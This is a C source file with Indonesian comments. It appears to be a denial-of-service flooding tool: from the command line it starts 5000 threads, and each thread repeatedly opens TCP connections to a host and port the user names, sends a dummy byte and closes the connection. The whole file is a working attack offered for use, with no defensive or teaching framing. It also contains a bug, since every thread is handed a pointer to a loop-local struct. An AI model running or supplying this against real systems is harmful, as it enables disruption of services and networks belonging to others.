#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <poll.h>
#include <signal.h>
#include <errno.h>

#define CONNECTIONS_PER_THREAD 50     // Jumlah koneksi per thread
#define THREAD_POOL_SIZE 5000          // Jumlah thread besar
#define MAX_TASKS 100000               // Task queue limit

typedef struct {
    char host[256];
    char port[10];
    int id;
} Task;

Task task_queue[MAX_TASKS];
int task_count = 0;
pthread_mutex_t queue_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t queue_cond = PTHREAD_COND_INITIALIZER;

void broke(int s) {
    // Signal handler placeholder
}

int make_socket(char *host, char *port) {
    struct addrinfo hints, *servinfo, *p;
    int sock, r;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    if ((r = getaddrinfo(host, port, &hints, &servinfo)) != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
        return -1;
    }

    for (p = servinfo; p != NULL; p = p->ai_next) {
        if ((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1)
            continue;
        if (connect(sock, p->ai_addr, p->ai_addrlen) == -1) {
            close(sock);
            continue;
        }
        break;
    }

    if (p == NULL) {
        fprintf(stderr, "No connection could be made\n");
        freeaddrinfo(servinfo);
        return -1;
    }

    freeaddrinfo(servinfo);
    return sock;
}

void *worker_thread(void *arg) {
    Task *task = (Task *)arg;
    int sockets[CONNECTIONS_PER_THREAD];
    signal(SIGPIPE, &broke);
    for (int i = 0; i < CONNECTIONS_PER_THREAD; i++) {
        sockets[i] = make_socket(task->host, task->port);
        if (sockets[i] != -1) {
            write(sockets[i], "\0", 1);  // Kirim data dummy
            fprintf(stderr, "[%i: Connection Established]\n", task->id);
            close(sockets[i]);
        } else {
            fprintf(stderr, "[%i: Connection Failed]\n", task->id);
        }
        usleep(5000); // Delay sangat kecil untuk mempercepat task
    }
    return NULL;
}

void add_task(char *host, char *port, int id) {
    pthread_mutex_lock(&queue_mutex);
    if (task_count < MAX_TASKS) {
        strncpy(task_queue[task_count].host, host, sizeof(task_queue[task_count].host));
        strncpy(task_queue[task_count].port, port, sizeof(task_queue[task_count].port));
        task_queue[task_count].id = id;
        task_count++;
        pthread_cond_signal(&queue_cond);
    }
    pthread_mutex_unlock(&queue_mutex);
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <host> <port>\n", argv[0]);
        exit(1);
    }

    pthread_t threads[THREAD_POOL_SIZE];
    for (int i = 0; i < THREAD_POOL_SIZE; i++) {
        Task task;
        strncpy(task.host, argv[1], sizeof(task.host));
        strncpy(task.port, argv[2], sizeof(task.port));
        task.id = i;
        pthread_create(&threads[i], NULL, worker_thread, &task);
    }

    for (int i = 0; i < THREAD_POOL_SIZE; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
